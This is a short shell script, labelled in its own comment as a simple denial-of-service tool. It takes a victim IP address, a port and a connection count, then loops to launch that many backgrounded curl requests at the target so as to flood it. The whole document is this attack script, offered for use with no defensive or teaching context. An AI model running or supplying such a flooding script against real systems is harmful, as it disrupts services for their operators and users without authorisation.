#A very simple DoS pscript. Starts one command thread(?) for each connection. Requires a lot of computing powes.
#Arguments: 1:VICTIM_IP_ADDRESS  2:VICTIM_PORT  3:NUMBER_OF_CONNECTIONS
i=0
while [ $i -lt $3 ]
do
    curl $1:$2 &
    i=$(($i + 1))
done